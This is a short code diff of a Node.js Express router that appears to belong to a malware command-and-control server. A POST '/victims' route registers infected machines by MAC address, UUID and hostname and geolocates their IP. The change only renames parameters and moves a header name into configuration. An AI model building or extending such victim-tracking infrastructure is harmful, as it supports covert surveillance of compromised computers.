@@ -110,13 +110,13 @@ router.get('/victims/:id/logs', (req, res) => {
  * 
  * @apiPermission None
  * 
- * @apiParam {String} MACAddress Victims MAC
- * @apiParam {String} UUID
- * @apiParam {String} Hostname
+ * @apiParam {String} macAddress Victims MAC
+ * @apiParam {String} uuid
+ * @apiParam {String} hostname
  * @apiSuccess {Object} Victim Returns victim object with all attributes
  */
 router.post('/victims', (req, res) => {
-  var ip = req.headers['X-Real-IP'] || req.connection.remoteAddress;
+  var ip = req.headers[process.env.PROXY_HEADER_REAL_IP_KEY] || req.connection.remoteAddress;
   var useragent = req.headers['user-agent'];
   
   request.get('http://ip-api.com/json/' + ip, (error, response, body) => {
